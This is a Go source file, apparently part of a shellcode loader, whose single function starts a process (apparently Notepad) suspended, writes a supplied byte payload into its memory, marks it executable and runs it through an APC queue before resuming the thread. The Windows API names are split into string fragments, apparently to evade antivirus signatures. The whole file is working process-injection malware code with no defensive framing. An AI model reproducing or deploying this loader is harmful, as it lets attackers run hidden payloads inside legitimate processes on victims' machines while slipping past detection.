package loader

import (
	"syscall"
	"unsafe"
	"upx/utils"

	"golang.org/x/sys/windows"
)

func RunEar(code []byte) {
	kel32 := windows.NewLazySystemDLL(utils.GetKe32DllName())
	VirlocEx := kel32.NewProc("Vi" + "rtual" + "All" + "ocEx")
	VirPEx := kel32.NewProc("Vir" + "tualP" + "rote" + "ctEx")
	WritePMemory := kel32.NewProc("Wri" + "tePr" + "ocessM" + "emory")
	QueUserA := kel32.NewProc("Qu" + "eueUs" + "erA" + "PC")
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	program, _ := syscall.UTF16PtrFromString(utils.GetNotePath())
	args, _ := syscall.UTF16PtrFromString("")
	_ = windows.CreateProcess(
		program,
		args,
		nil, nil, true,
		windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	addr, _, _ := VirlocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(code)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	_, _, _ = WritePMemory.Call(uintptr(procInfo.Process), addr,
		(uintptr)(unsafe.Pointer(&code[0])), uintptr(len(code)))
	oldProtect := windows.PAGE_READWRITE
	_, _, _ = VirPEx.Call(uintptr(procInfo.Process), addr,
		uintptr(len(code)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	_, _, _ = QueUserA.Call(addr, uintptr(procInfo.Thread), 0)
	_, _ = windows.ResumeThread(procInfo.Thread)
	_ = windows.CloseHandle(procInfo.Process)
	_ = windows.CloseHandle(procInfo.Thread)
}
